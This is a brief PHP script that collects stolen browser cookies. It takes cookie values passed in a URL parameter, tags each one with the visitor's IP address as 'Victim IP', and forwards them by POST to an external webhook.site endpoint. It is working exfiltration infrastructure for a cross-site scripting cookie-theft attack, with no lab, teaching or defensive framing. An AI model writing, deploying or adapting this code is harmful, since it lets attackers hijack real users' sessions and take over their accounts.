<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $ip = $_SERVER['REMOTE_ADDR'];

        // Prepare the data to send
        $data = "Victim IP: {$ip} | Cookie: {$cookie}";

        // Send to webhook
        $ch = curl_init("https://webhook.site/4502ef0f-2be0-499b-a061-31b3aa6dbb5b");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
